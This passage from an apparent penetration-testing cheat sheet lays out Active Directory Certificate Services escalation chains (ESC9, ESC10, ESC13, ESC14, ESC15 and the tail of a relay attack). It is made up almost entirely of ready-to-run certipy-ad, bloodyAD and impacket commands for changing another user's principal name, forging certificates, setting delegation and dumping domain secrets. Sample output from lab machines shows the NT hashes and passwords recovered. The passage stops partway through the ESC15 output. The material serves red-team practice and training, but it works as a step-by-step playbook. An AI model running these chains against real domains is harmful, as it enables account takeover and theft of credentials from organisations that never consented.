COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

#### 5. Get NTLM Hash

```console
certipy-ad auth -pfx <DC_HOSTNAME>.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad auth -pfx DC-JPQ225.pfx -domain cicada.vl -dc-ip 10.129.234.48
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

{{< /tabcontent >}}
{{< tabcontent set11 tab2 >}}

#### 1. Setup

```console
+-------------------------------------------------+
| 1. Join Domain                                  |
| 2. Config DNS                                   |
| 3. Config C:\Windows\System32\drivers\etc\hosts |
+-------------------------------------------------+
```

#### 2. Request a Ticket

```console
.\rubeus.exe asktgt /user:'<USER>' /password:'<PASSWORD>' /enctype:AES256 /domain:'<DOMAIN>' /dc:'<DC>' /ptt /nowrap
```

#### 3. Check

```console
klist
```

#### 4. RemoteKrbRelay

```console
.\RemoteKrbRelay.exe -adcs -template DomainController -victim <VICTIM> -target <TARGET> -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3
```

#### 5. Convert Base64 Encoded Cert to p12

```console
cat cert_b64 | base64 -d > cert.p12
```

#### 6. Get NTLM Hash

```console
certipy-ad auth -pfx cert.p12 -domain <DOMAIN> -dc-ip <DC_IP>
```

<small>*Ref: [RemoteKrbRelay](https://github.com/CICADA8-Research/RemoteKrbRelay)*</small>

{{< /tabcontent >}}

---

### ESC9: No Security Extension on Certificate Template

{{< tab set12 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set12 tab1 >}}

#### 1. Modify Target User's userPrincipalName (With GenericAll/GenericWrite)

```console {class="password"}
# Password
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -user <TARGET_USER> -upn Administrator
```

```console {class="sample-code"}
$ certipy-ad account update -u 'management_svc@certified.htb' -p 'Password123!' -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

```console {class="ntlm"}
# NTLM
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -dc-ip <DC_IP> -user <TARGET_USER> -upn Administrator
```

```console {class="sample-code"}
$ certipy-ad account update -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <DC> -dc-host <DC> -dc-ip <DC_IP> -user <TARGET_USER> -upn Administrator
```

```console {class="sample-code"}
$ certipy-ad account update -u 'management_svc@certified.htb' -p 'Password123!' -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -k -target <DC> -dc-host <DC> -dc-ip <DC_IP> -user <TARGET_USER> -upn Administrator
```

```console {class="sample-code"}
$ certipy-ad account update -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -k -dc-host <DC> -target <DC> -dc-ip <DC_IP> -user <TARGET_USER> -upn Administrator
```

```console {class="sample-code"}
$ certipy-ad account update -u 'management_svc@certified.htb' -k -dc-host dc01.certified.htb -target dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

#### 2. Request a Cert of Target User

```console {class="password"}
# Password
certipy-ad req -u '<TARGET_USER>' -p '<TARGET_USER_PASSWORD>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -u 'ca_operator' -p 'Password123!' -target dc01.certified.htb -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<TARGET_USER>' -hashes '<TARGET_USER_HASH>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -u 'ca_operator@certified.htb' -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<TARGET_USER>@<DOMAIN>' -p '<TARGET_USER_PASSWORD>' -k -target <TARGET> -dc-host <DC> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -u 'ca_operator@certified.htb' -p 'Password123!' -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<TARGET_USER>@<DOMAIN>' -hashes '<TARGET_USER_HASH>' -k -target <TARGET> -dc-host <DC> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -u 'ca_operator@certified.htb' -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<TARGET_USER>@<DOMAIN>' -k -target <TARGET> -dc-host <DC> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -u 'ca_operator@certified.htb' -k -target dc01.certified.htb -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### 3. Change Back Target User's userPrincipalName

```console {class="password"}
# Password
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -user <TARGET_USER> -upn <TARGET_USER>@<DOMAIN>
```

```console {class="sample-code"}
$ certipy-ad account update -u 'management_svc@certified.htb' -p 'Password123!' -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

```console {class="ntlm"}
# NTLM
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -dc-ip <DC_IP> -user <TARGET_USER> -upn <TARGET_USER>@<DOMAIN>
```

```console {class="sample-code"}
$ certipy-ad account update -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-host <DC> -dc-ip <DC_IP> -user <TARGET_USER> -upn <TARGET_USER>@<DOMAIN>
```

```console {class="sample-code"}
$ certipy-ad account update -u 'management_svc@certified.htb' -p 'Password123!' -k -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -k -target <TARGET> -dc-host <DC> -dc-ip <DC_IP> -user <TARGET_USER> -upn <TARGET_USER>@<DOMAIN>
```

```console {class="sample-code"}
$ certipy-ad account update -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -k -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-host <DC> -dc-ip <DC_IP> -user <TARGET_USER> -upn <TARGET_USER>@<DOMAIN>
```

```console {class="sample-code"}
$ certipy-ad account update -u 'management_svc@certified.htb' -k -dc-host dc01.certified.htb -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

#### 4. Get NTLM Hash

```console
certipy-ad auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

{{< /tabcontent >}}

---

### ESC10: Weak Certificate Mapping for Schannel Authentication

{{< tab set13 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set13 tab1 >}}

#### 1. Check altSecurityIdentities

```console {class="password"}
# Password
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --host <DC> get writable --detail
```

```console {class="sample-code"}
---[SNIP]---
altSecurityIdentities: WRITE
---[SNIP]---
```

```console {class="ntlm"}
# NTLM
bloodyAD -u '<USER>' -p ':<HASH>' -f rc4 -d <DOMAIN> --host <DC> get writable --detail
```

```console {class="sample-code"}
---[SNIP]---
altSecurityIdentities: WRITE
---[SNIP]---
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --host <DC> get writable --detail
```

```console {class="sample-code"}
---[SNIP]---
altSecurityIdentities: WRITE
---[SNIP]---
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
bloodyAD -u '<USER>' -p ':<HASH>' -f rc4 -d <DOMAIN> -k --host <DC> get writable --detail
```

```console {class="sample-code"}
---[SNIP]---
altSecurityIdentities: WRITE
---[SNIP]---
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -u '<USER>' -d <DOMAIN> -k --host <DC> get writable --detail
```

```console {class="sample-code"}
---[SNIP]---
altSecurityIdentities: WRITE
---[SNIP]---
```

#### 2. Check CertificateMappingMethods

```console
# Look for CertificateMappingMethods = 0x4
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\'
```

```console {class="sample-code"}
$ reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\'

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
    EventLogging    REG_DWORD    0x1
    CertificateMappingMethods    REG_DWORD    0x4

---[SNIP]---
```

#### 3. Check Target User UPN

```console {class="password"}
# Password
certipy-ad account -u '<USER>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
```

```console {class="ntlm"}
# NTLM
certipy-ad account -u '<USER>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user '<TARGET_USER>' read
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user '<TARGET_USER>' read
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user '<TARGET_USER>' read
```

#### 2. Modify Target User's userPrincipalName

```console {class="password"}
# Password
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user <TARGET_USER> -upn '<DC_HOSTNAME>$@<DOMAIN>'
```

```console {class="ntlm"}
# NTLM
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn '<DC_HOSTNAME>$@<DOMAIN>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn '<DC_HOSTNAME>$@<DOMAIN>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn '<DC_HOSTNAME>$@<DOMAIN>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn '<DC_HOSTNAME>$@<DOMAIN>'
```

#### 2. Request a Cert of Target User

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template 'User'
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template 'User'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'User'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'User'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'User'
```

#### 3. Change Back Target User's userPrincipalName

```console {class="password"}
# Password
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user <TARGET_USER> -upn '<TARGET_USER_UPN>'
```

```console {class="ntlm"}
# NTLM
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn '<TARGET_USER_UPN>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn '<TARGET_USER_UPN>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn '<TARGET_USER_UPN>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn '<TARGET_USER_UPN>'
```

#### 4. Get LDAP Shell

```console
certipy-ad auth -pfx '<DC_HOSTNAME>.pfx' -dc-ip '<DC_IP>' -ldap-shell
```

#### 5. Set RBCD

```console
set_rbcd <DC_HOSTNAME>$ <USER>
```

#### 6. Get a Service Ticket

```console {class="password"}
# Password
impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -spn 'ldap/<DC>' -impersonate <DC_HOSTNAME>
```

```console {class="ntlm"}
# NTLM
impacket-getST '<DOMAIN>/<USER>' -hashes ':<HASH>' -spn 'ldap/<DC>' -impersonate <DC_HOSTNAME>
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -k -spn 'ldap/<DC>' -impersonate <DC_HOSTNAME>
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-getST '<DOMAIN>/<USER>' -hashes ':<HASH>' -k -spn 'ldap/<DC>' -impersonate <DC_HOSTNAME>
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-getST '<DOMAIN>/<USER>' -k -spn 'ldap/<DC>' -impersonate <DC_HOSTNAME>
```

#### 7. Secrets Dump

```console
# Pass-the-ticket
export KRB5CCNAME='<CCACHE>'
```

```console
# Ticket-based Kerberos
impacket-secretsdump -k -no-pass <DC>
```

{{< /tabcontent >}}

---

### ESC13: Issuance Policy with Privileged Group Linked

{{< tab set14 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set14 tab1 >}}

#### 1. Request a Cert of User

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

#### 2. Get NTLM Hash

```console
certipy-ad auth -pfx '<USER>.pfx' -dc-ip '<DC_IP>'
```

{{< /tabcontent >}}

---

### ESC14a: Weak Explicit Certificate Mapping (altSecurityIdentities)

{{< tab set15 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set15 tab1 >}}

#### 1. Create a Computer

```console {class="password"}
# Password
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --host <DC> add computer '<NEW_COMPUTER>' '<NEW_PASSWORD>'
```

```console {class="ntlm"}
# NTLM
bloodyAD -u '<USER>' -p ':<HASH>' -f rc4 -d <DOMAIN> --host <DC> add computer '<NEW_COMPUTER>' '<NEW_PASSWORD>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --host <DC> add computer '<NEW_COMPUTER>' '<NEW_PASSWORD>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
bloodyAD -u '<USER>' -p ':<HASH>' -f rc4 -d <DOMAIN> -k --host <DC> add computer '<NEW_COMPUTER>' '<NEW_PASSWORD>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -u '<USER>' -d <DOMAIN> -k --host <DC> add computer '<NEW_COMPUTER>' '<NEW_PASSWORD>'
```

#### 2. Request a Cert of the Computer

```console {class="password"}
# Password
certipy-ad req -u '<NEW_COMPUTER>$' -p '<NEW_PASSWORD>' -target <DC> -dc-ip <DC_IP> -ca <CA> -template 'Machine' 
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<NEW_COMPUTER>$' -p '<NEW_PASSWORD>' -k -target <DC> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'Machine'
```

#### 3. Convert .pfx to .crt

```console
certipy-ad cert -pfx <NEW_COMPUTER>.pfx -nokey -out "<NEW_COMPUTER>.crt" 
```

#### 4. Inspect Serial Number and Issuer

```console
openssl x509 -in <NEW_COMPUTER>.crt -noout -text
```

#### 5. Convert to X509 Issuer SerialNumber Format

```console
python3 conv.py -serial '<SERIAL_NUMBER>' -issuer '<ISSUER>'
```

#### 6. Update Attribute (From Windows)

```console
$map = '<X509_ISSUER_SERIAL_NUMBER_FORMAT>'
```

```console
Set-ADUser <TARGET_USER> -Replace @{altSecurityIdentities=$map}
```

#### 7. Get NTLM Hash

```console
certipy-ad auth -pfx <NEW_COMPUTER>.pfx -domain <DOMAIN> -dc-ip <DC_IP> -u '<TARGET_USER>'
```

<small>*Ref: [conv.py](https://mayfly277.github.io/posts/ADCS-part14/#esc14-a---write-access-on-altsecurityidentities)*</small>

{{< /tabcontent >}}

---

### ESC14b: Weak Explicit Certificate Mapping (E-Mail)

{{< tab set16 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set16 tab1 >}}

#### 1. Modify Email of Target User

```console {class="password"}
# Password
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --host <DC> set object <USER> mail -v '<TARGET_USER>@<DOMAIN>'
```

```console {class="ntlm"}
# NTLM
bloodyAD -u '<USER>' -p ':<HASH>' -f rc4 -d <DOMAIN> --host <DC> set object <USER> mail -v '<TARGET_USER>@<DOMAIN>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --host <DC> set object <USER> mail -v '<TARGET_USER>@<DOMAIN>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
bloodyAD -u '<USER>' -p ':<HASH>' -f rc4 -d <DOMAIN> -k --host <DC> set object <USER> mail -v '<TARGET_USER>@<DOMAIN>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -u '<USER>' -d <DOMAIN> -k --host <DC> set object <USER> mail -v '<TARGET_USER>@<DOMAIN>'
```

#### 2. Request a Cert

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

#### 3. Get NTLM Hash

```console
certipy-ad auth -pfx <USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP> -u <TARGET_USER>
```

{{< /tabcontent >}}

---

### ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")

{{< tab set17 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set17 tab1 >}}

#### 1. Lookup SID

```console {class="password"}
# Password
certipy-ad account -u '<USER>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -user 'administrator' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'cert_admin' -p 'Password123!' -target 'DC01.tombwatcher.htb' -dc-ip '10.129.31.255' -user 'cert_admin' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'cert_admin':
    cn                                  : cert_admin.2
    distinguishedName                   : CN=cert_admin.2,OU=ADCS,DC=tombwatcher,DC=htb
    name                                : cert_admin.2
    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1111
    sAMAccountName                      : cert_admin
    userAccountControl                  : 66048
    whenCreated                         : 2024-11-16T17:07:04+00:00
    whenChanged                         : 2025-10-31T14:47:11+00:00
```

```console {class="ntlm"}
# NTLM
certipy-ad account -u '<USER>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -user 'administrator' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'cert_admin' -hashes '2b576acbe6bcfda7294d6bd18041b8fe' -target 'DC01.tombwatcher.htb' -dc-ip '10.129.31.255' -user 'cert_admin' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'cert_admin':
    cn                                  : cert_admin.2
    distinguishedName                   : CN=cert_admin.2,OU=ADCS,DC=tombwatcher,DC=htb
    name                                : cert_admin.2
    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1111
    sAMAccountName                      : cert_admin
    userAccountControl                  : 66048
    whenCreated                         : 2024-11-16T17:07:04+00:00
    whenChanged                         : 2025-10-31T14:47:11+00:00
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user 'administrator' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -k -target 'DC01.tombwatcher.htb' -dc-host DC01.tombwatcher.htb -dc-ip 10.129.31.255 -user 'cert_admin' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Reading attributes for 'cert_admin':
    cn                                  : cert_admin.2
    distinguishedName                   : CN=cert_admin.2,OU=ADCS,DC=tombwatcher,DC=htb
    name                                : cert_admin.2
    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1111
    sAMAccountName                      : cert_admin
    userAccountControl                  : 66048
    whenCreated                         : 2024-11-16T17:07:04+00:00
